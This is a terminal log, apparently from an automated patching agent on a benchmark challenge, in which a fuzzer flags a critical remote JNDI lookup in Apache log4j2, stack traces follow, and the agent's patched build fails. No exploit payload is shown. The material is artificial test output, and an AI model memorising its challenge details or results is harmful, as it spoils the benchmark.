[2;36m[01/06/26 17:06:05][0m[2;36m [0m[34mINFO    [0m Building environment                                                                 ]8;id=874033;file:///home/qqor/crete/packages/crete/framework/context_builder/services/aixcc/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=829888;file:///home/qqor/crete/packages/crete/framework/context_builder/services/aixcc/__init__.py#132\[2m132[0m]8;;\
[2;36m                    [0m         - Cache directory: [35m/tmp/[0m[95mtmp4th5q0xs[0m                                                  [2m               [0m
[2;36m                    [0m         - Max timeout: [1;36m1800[0m                                                                  [2m               [0m
[2;36m                    [0m         - Output directory:                                                                  [2m               [0m
[2;36m                    [0m         [35m/home/qqor/crete/reports/prism.prism_claude_sonnet_4_5/log4j2_log4j2-delta-01_vuln_0[0m [2m               [0m
[2;36m                    [0m         [35m/[0m[95magent-output-1767719165.307853[0m                                                      [2m               [0m
[2;36m                    [0m         - Detection toml file:                                                               [2m               [0m
[2;36m                    [0m         scripts/benchmark/afc-no-delta/log4j2_log4j2-delta-01_vuln_0.toml                    [2m               [0m
[2;36m                    [0m         - Challenge project directory: [35m/home/qqor/crete/.cache/[0m[95mofficial-afc-logging-log4j2[0m   [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Building Cached for CLEAN environment[1m)[0m Started[33m...[0m ]8;id=555412;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=2577;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/06/26 17:07:20][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Building Cached for CLEAN environment[1m)[0m Took      ]8;id=655251;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=166124;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [1;36m75.41[0m seconds; [33mexception[0m=[3;91mFalse[0m                                                [2m                      [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Running tests for Cached for CLEAN environment[1m)[0m   ]8;id=444725;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=515794;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m                    [0m         Started[33m...[0m                                                                     [2m                     [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Running tests for Cached for CLEAN environment[1m)[0m  ]8;id=150862;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=169901;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         Took [1;36m0.00[0m seconds; [33mexception[0m=[3;91mFalse[0m                                            [2m                      [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m Setting timeouts                                                                       ]8;id=604958;file:///home/qqor/crete/packages/crete/framework/environment/services/oss_fuzz/default.py\[2mdefault.py[0m]8;;\[2m:[0m]8;id=469810;file:///home/qqor/crete/packages/crete/framework/environment/services/oss_fuzz/default.py#85\[2m85[0m]8;;\
[2;36m                    [0m           - build: [1;36m600[0m [1m([0moriginal: [1;36m75[0m[1m)[0m                                                          [2m             [0m
[2;36m                    [0m           - run tests: [1;36m600[0m [1m([0moriginal: [1;36m0[0m[1m)[0m                                                       [2m             [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=981851;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=537402;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/06/26 17:07:21][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m0.92[0m seconds;                ]8;id=27634;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=487853;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m[01/06/26 17:07:22][0m[2;36m [0m[34mINFO    [0m Successfully created Cached for CLEAN environment                                    ]8;id=596801;file:///home/qqor/crete/packages/crete/framework/environment_pool/services/oss_fuzz.py\[2moss_fuzz.py[0m]8;;\[2m:[0m]8;id=496314;file:///home/qqor/crete/packages/crete/framework/environment_pool/services/oss_fuzz.py#256\[2m256[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m Current environments: [1m[[0m[32m'CLEAN -> Cached'[0m[1m][0m                                            ]8;id=114248;file:///home/qqor/crete/packages/crete/framework/environment_pool/services/oss_fuzz.py\[2moss_fuzz.py[0m]8;;\[2m:[0m]8;id=695462;file:///home/qqor/crete/packages/crete/framework/environment_pool/services/oss_fuzz.py#265\[2m265[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m Prism Supervisor Routing: TeamStatus.START -> TeamStatus.EVALUATE                    ]8;id=483000;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=341006;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py#160\[2m160[0m]8;;\
[2;36m                    [0m         [1m([0mn evals: [1;36m0[0m, patch status: PatchStatus.INITIALIZED[1m)[0m                                  [2m               [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=260192;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=947351;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/06/26 17:07:23][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m1.01[0m seconds;                ]8;id=274719;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=337739;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=709840;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=711664;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/06/26 17:07:24][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m0.85[0m seconds;                ]8;id=240778;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=349591;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m[01/06/26 17:07:30][0m[2;36m [0m[34mINFO    [0m ===Evaluator [33mResult[0m===                                                              ]8;id=801238;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/teams/evaluation/evaluator.py\[2mevaluator.py[0m]8;;\[2m:[0m]8;id=743454;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/teams/evaluation/evaluator.py#204\[2m204[0m]8;;\
[2;36m                    [0m         PatchStatus.VULNERABLE                                                              [2m                [0m
[2;36m                    [0m         ===Evaluator [33mDiff[0m===                                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ===Patch [33mResult[0m===                                                                  [2m                [0m
[2;36m                    [0m         == Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical:    [2m                [0m
[2;36m                    [0m         Remote JNDI Lookup                                                                  [2m                [0m
[2;36m                    [0m         JNDI lookups with attacker-controlled remote URLs can, depending on the JDK         [2m                [0m
[2;36m                    [0m         version, lead to remote code execution or the exfiltration of information.          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35mcom.code_intelligence.jazzer.sanitizers.NamingContextLookup.lookupHook[0m[1m([0mNamingContex [2m                [0m
[2;36m                    [0m         tLookup.kt:[1;36m61[0m[1m)[0m                                                                      [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.JndiLookup.lookup[0m[1m([0mJndiLookup.jav[1;92ma:60[0m[1m)[0m          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.Interpolator.lookup[0m[1m([0mInterpolator.jav[1;92ma:112[0m[1m)[0m     [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable[0m[1m([0mStrSubstitutor. [2m                [0m
[2;36m                    [0m         jav[1;92ma:904[0m[1m)[0m                                                                           [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1m([0mStrSubstitutor.jav[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m825[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1m([0mStrSubstitutor.jav[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m737[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.replace[0m[1m([0mStrSubstitutor.jav[1;92ma:306[0m [2m                [0m
[2;36m                    [0m         [1m)[0m                                                                                   [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.MessagePatternConverter.format[0m[1m([0mMessagePattern [2m                [0m
[2;36m                    [0m         Converter.jav[1;92ma:72[0m[1m)[0m                                                                  [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.PatternFormatter.format[0m[1m([0mPatternFormatter.jav[1;92ma[0m [2m                [0m
[2;36m                    [0m         [1;92m:36[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1m([0mPatternLayout.jav [2m                [0m
[2;36m                    [0m         [1;92ma:166[0m[1m)[0m                                                                              [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1m([0mPatternLayout.jav [2m                [0m
[2;36m                    [0m         [1;92ma:51[0m[1m)[0m                                                                               [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.AbstractStringLayout.toByteArray[0m[1m([0mAbstractStrin [2m                [0m
[2;36m                    [0m         gLayout.jav[1;92ma:45[0m[1m)[0m                                                                    [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append[0m[1m([0mAbstract [2m                [0m
[2;36m                    [0m         OutputStreamAppender.jav[1;92ma:113[0m[1m)[0m                                                      [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.AppenderControl.callAppender[0m[1m([0mAppenderControl.j [2m                [0m
[2;36m                    [0m         av[1;92ma:102[0m[1m)[0m                                                                            [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.callAppenders[0m[1m([0mLoggerConfig.jav[1;92ma:4[0m [2m                [0m
[2;36m                    [0m         [1;92m26[0m[1m)[0m                                                                                 [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1m([0mLoggerConfig.jav[1;92ma:407[0m[1m)[0m        [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1m([0mLoggerConfig.jav[1;92ma:368[0m[1m)[0m        [2m                [0m
[2;36m                    [0m                 at [1;35morg.apache.logging.log4j.core.Logger.log[0m[1m([0mLogger.jav[1;92ma:110[0m[1m)[0m                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.spi.AbstractLogger.warn[0m[1m([0mAbstractLogger.jav[1;92ma:1916[0m[1m)[0m          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35mcom.example.SimpleLoggerFuzzer.fuzzerTestOneInput[0m[1m([0mSimpleLoggerFuzzer.jav[1;92ma:42[0m[1m)[0m       [2m                [0m
[2;36m                    [0m         DEDUP_TOKEN: 03a39a742f79fa3d                                                       [2m                [0m
[2;36m                    [0m         == libFuzzer crashing input ==                                                      [2m                [0m
[2;36m                    [0m         ===[33mIssue[0m===                                                                         [2m                [0m
[2;36m                    [0m         == Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical:    [2m                [0m
[2;36m                    [0m         Remote JNDI Lookup                                                                  [2m                [0m
[2;36m                    [0m         JNDI lookups with attacker-controlled remote URLs can, depending on the JDK         [2m                [0m
[2;36m                    [0m         version, lead to remote code execution or the exfiltration of information.          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35mcom.code_intelligence.jazzer.sanitizers.NamingContextLookup.lookupHook[0m[1m([0mNamingContex [2m                [0m
[2;36m                    [0m         tLookup.kt:[1;36m61[0m[1m)[0m                                                                      [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.JndiLookup.lookup[0m[1m([0mJndiLookup.jav[1;92ma:60[0m[1m)[0m          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.Interpolator.lookup[0m[1m([0mInterpolator.jav[1;92ma:112[0m[1m)[0m     [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable[0m[1m([0mStrSubstitutor. [2m                [0m
[2;36m                    [0m         jav[1;92ma:904[0m[1m)[0m                                                                           [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1m([0mStrSubstitutor.jav[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m825[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1m([0mStrSubstitutor.jav[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m737[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.replace[0m[1m([0mStrSubstitutor.jav[1;92ma:306[0m [2m                [0m
[2;36m                    [0m         [1m)[0m                                                                                   [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.MessagePatternConverter.format[0m[1m([0mMessagePattern [2m                [0m
[2;36m                    [0m         Converter.jav[1;92ma:72[0m[1m)[0m                                                                  [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.PatternFormatter.format[0m[1m([0mPatternFormatter.jav[1;92ma[0m [2m                [0m
[2;36m                    [0m         [1;92m:36[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1m([0mPatternLayout.jav [2m                [0m
[2;36m                    [0m         [1;92ma:166[0m[1m)[0m                                                                              [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1m([0mPatternLayout.jav [2m                [0m
[2;36m                    [0m         [1;92ma:51[0m[1m)[0m                                                                               [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.AbstractStringLayout.toByteArray[0m[1m([0mAbstractStrin [2m                [0m
[2;36m                    [0m         gLayout.jav[1;92ma:45[0m[1m)[0m                                                                    [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append[0m[1m([0mAbstract [2m                [0m
[2;36m                    [0m         OutputStreamAppender.jav[1;92ma:113[0m[1m)[0m                                                      [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.AppenderControl.callAppender[0m[1m([0mAppenderControl.j [2m                [0m
[2;36m                    [0m         av[1;92ma:102[0m[1m)[0m                                                                            [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.callAppenders[0m[1m([0mLoggerConfig.jav[1;92ma:4[0m [2m                [0m
[2;36m                    [0m         [1;92m26[0m[1m)[0m                                                                                 [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1m([0mLoggerConfig.jav[1;92ma:407[0m[1m)[0m        [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1m([0mLoggerConfig.jav[1;92ma:368[0m[1m)[0m        [2m                [0m
[2;36m                    [0m                 at [1;35morg.apache.logging.log4j.core.Logger.log[0m[1m([0mLogger.jav[1;92ma:110[0m[1m)[0m                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.spi.AbstractLogger.warn[0m[1m([0mAbstractLogger.jav[1;92ma:1916[0m[1m)[0m          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35mcom.example.SimpleLoggerFuzzer.fuzzerTestOneInput[0m[1m([0mSimpleLoggerFuzzer.jav[1;92ma:42[0m[1m)[0m       [2m                [0m
[2;36m                    [0m         DEDUP_TOKEN: 03a39a742f79fa3d                                                       [2m                [0m
[2;36m                    [0m         == libFuzzer crashing input ==                                                      [2m                [0m
[2;36m                    [0m         ===Evaluation [33mReport[0m===                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ===Analysis [33mReport[0m===                                                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ===Evaluation [33mEnd[0m===                                                                [2m                [0m
[2;36m[01/06/26 17:07:53][0m[2;36m [0m[34mINFO    [0m Prism Supervisor Routing: TeamStatus.EVALUATE -> TeamStatus.ANALYZE                  ]8;id=883094;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=946976;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py#160\[2m160[0m]8;;\
[2;36m                    [0m         [1m([0mn evals: [1;36m1[0m, patch status: PatchStatus.VULNERABLE[1m)[0m                                   [2m               [0m
[2;36m[01/06/26 17:13:10][0m[2;36m [0m[34mINFO    [0m Prism Supervisor Routing: TeamStatus.ANALYZE -> TeamStatus.[1;33mPATCH[0m                     ]8;id=844762;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=316316;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py#160\[2m160[0m]8;;\
[2;36m                    [0m         [1m([0mn evals: [1;36m1[0m, patch status: PatchStatus.VULNERABLE[1m)[0m                                   [2m               [0m
[2;36m[01/06/26 17:14:21][0m[2;36m [0m[34mINFO    [0m Prism Supervisor Routing: TeamStatus.[1;33mPATCH[0m -> TeamStatus.EVALUATE                    ]8;id=79924;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=605861;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py#160\[2m160[0m]8;;\
[2;36m                    [0m         [1m([0mn evals: [1;36m1[0m, patch status: PatchStatus.VULNERABLE[1m)[0m                                   [2m               [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=206407;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=67693;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/06/26 17:14:22][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m0.96[0m seconds;                ]8;id=63412;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=921779;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Patching[1m)[0m Started[33m...[0m                              ]8;id=852329;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=490478;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m Checking valid diff: [35m/tmp/[0m[95mtmpykzrca9z[0m                                                 ]8;id=885963;file:///home/qqor/crete/packages/crete/framework/environment/services/oss_fuzz/default.py\[2mdefault.py[0m]8;;\[2m:[0m]8;id=865300;file:///home/qqor/crete/packages/crete/framework/environment/services/oss_fuzz/default.py#173\[2m173[0m]8;;\
[2;36m[01/06/26 17:14:57][0m[2;36m [0m[1;31mERROR   [0m Failed to build the challenge                                                         ]8;id=647903;file:///home/qqor/crete/packages/crete/framework/evaluator/services/default/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=520333;file:///home/qqor/crete/packages/crete/framework/evaluator/services/default/__init__.py#53\[2m53[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [35m/home/qqor/crete/reports/prism.prism_claude_sonnet_4_5/log4j2_log4j2-delta-01_vuln_0[0m ]8;id=58112;file:///home/qqor/crete/packages/crete/framework/agent/functions.py\[2mfunctions.py[0m]8;;\[2m:[0m]8;id=338444;file:///home/qqor/crete/packages/crete/framework/agent/functions.py#17\[2m17[0m]8;;\
[2;36m                    [0m         [35m/agent-output-1767719165.307853/[0m[95mbuild_failed_stdout.txt[0m: [35m/[0m[95msrc[0m [35m/src/[0m[95mlogging-log4j2[0m    [2m               [0m
[2;36m                    [0m         [35m/src/[0m[95mlogging-log4j2[0m                                                                  [2m               [0m
[2;36m                    [0m         ---------------------------------------------------------------                      [2m               [0m
[2;36m                    [0m         vm.mmap_rnd_bits = [1;36m28[0m                                                                [2m               [0m
[2;36m                    [0m         ---------------------------------------------------------------                      [2m               [0m
[2;36m                    [0m         [33mCC[0m=[35mclang[0m                                                                             [2m               [0m
[2;36m                    [0m         [33mCXX[0m=[35mclang[0m++                                                                          [2m               [0m
[2;36m                    [0m         [33mCFLAGS[0m=-O1   -fno-omit-frame-pointer   -gline-tables-only                            [2m               [0m
[2;36m                    [0m         -Wno-[33merror[0m=[35menum[0m-constexpr-conversion                                                 [2m               [0m
[2;36m                    [0m         -Wno-[33merror[0m=[35mincompatible[0m-function-pointer-types   -Wno-[33merror[0m=[35mint[0m-conversion           [2m               [0m
[2;36m                    [0m         -Wno-[33merror[0m=[35mdeprecated[0m-declarations   -Wno-[33merror[0m=[35mimplicit[0m-function-declaration        [2m               [0m
[2;36m                    [0m         -Wno-[33merror[0m=[35mimplicit[0m-int   -Wno-[33merror[0m=[35mvla[0m-cxx-extension                               [2m               [0m
[2;36m                    [0m         -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION -[33mfsanitize[0m=[35maddress[0m                        [2m               [0m
[2;36m                    [0m         -fsanitize-address-use-after-scope -[33mfsanitize[0m=[35mfuzzer[0m-no-link -fno-[33msanitize[0m=[35mleak[0m      [2m               [0m
[2;36m                    [0m         [33mCXXFLAGS[0m=-O1   -fno-omit-frame-pointer   -gline-tables-only                          [2m               [0m
[2;36m                    [0m         -Wno-[33merror[0m=[35menum[0m-constexpr-conversion                                                 [2m               [0m
[2;36m                    [0m         -Wno-[33merror[0m=[35mincompatible[0m-function-pointer-types   -Wno-[33merror[0m=[35mint[0m-conversion           [2m               [0m
[2;36m                    [0m         -Wno-[33merror[0m=[35mdeprecated[0m-declarations   -Wno-[33merror[0m=[35mimplicit[0m-function-declaration        [2m               [0m
[2;36m                    [0m         -Wno-[33merror[0m=[35mimplicit[0m-int   -Wno-[33merror[0m=[35mvla[0m-cxx-extension                               [2m               [0m
[2;36m                    [0m         -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION -[33mfsanitize[0m=[35maddress[0m                        [2m               [0m
[2;36m                    [0m         -fsanitize-address-use-after-scope -[33mfsanitize[0m=[35mfuzzer[0m-no-link -[33mstdlib[0m=[35mlibc[0m++          [2m               [0m
[2;36m                    [0m         -fno-[33msanitize[0m=[35mleak[0m                                                                   [2m               [0m
[2;36m                    [0m         [33mRUSTFLAGS[0m=--cfg fuzzing -[33mZsanitizer[0m=[35maddress[0m -[33mCdebuginfo[0m=[1;36m1[0m -Cforce-frame-pointers     [2m               [0m
[2;36m                    [0m         ---------------------------------------------------------------                      [2m               [0m
[2;36m                    [0m         + [33m__REAL_MAVEN_REPO[0m=[35m/root/.m2/[0m[95mrepository[0m                                             [2m               [0m
[2;36m                    [0m         + [33m__SHARED_MAVEN_REPO[0m=[35m/work/[0m[95mmavencache[0m                                               [2m               [0m
[2;36m                    [0m         + [32m'[0m[32m[[0m[32m'[0m [32m'!'[0m -L [35m/root/.m2/[0m[95mrepository[0m [32m'[0m[32m][0m[32m'[0m                                                [2m               [0m
[2;36m                    [0m         + unset __REAL_MAVEN_REPO                                                            [2m               [0m
[2;36m                    [0m         + unset __SHARED_MAVEN_REPO                                                          [2m               [0m
[2;36m                    [0m         + [33mPROJECT[0m=[35mlogging[0m-log4j2                                                             [2m               [0m
[2;36m                    [0m         + [33mMAVEN_ARGS[0m=[32m'-DskipTests -Dspotless.skip -Drat.skip -Dspotbugs.skip [0m                [2m               [0m
[2;36m                    [0m         [32m-Dossindex.skip'[0m                                                                     [2m               [0m
[2;36m                    [0m         + cp [35m/src/[0m[95mSimpleLoggerFuzzer.options[0m [35m/out/[0m                                           [2m               [0m
[2;36m                    [0m         + set_project_version_in_fuzz_targets_dependency                                     [2m               [0m
[2;36m                    [0m         ++ cd [35m/src/[0m[95mlogging-log4j2[0m                                                            [2m               [0m
[2;36m                    [0m         ++ [35m/src/maven-3.6.3/apache-maven-3.6.3/bin/[0m[95mmvn[0m                                       [2m               [0m
[2;36m                    [0m         org.apache.maven.plugins:maven-help-plugin:[1;36m3.2[0m.[1;92m0:e[0mvaluate                            [2m               [0m
[2;36m                    [0m         -[33mDexpression[0m=[35mproject[0m.version -q -DforceStdout                                        [2m               [0m
[2;36m                    [0m         + [33mPROJECT_VERSION[0m=[1;36m2[0m[1;36m.0[0m-beta9-SNAPSHOT                                                 [2m               [0m
[2;36m                    [0m         + cd [35m/src/[0m[95mfuzz-targets[0m                                                               [2m               [0m
[2;36m                    [0m         + [35m/src/maven-3.6.3/apache-maven-3.6.3/bin/[0m[95mmvn[0m versions:use-dep-version               [2m               [0m
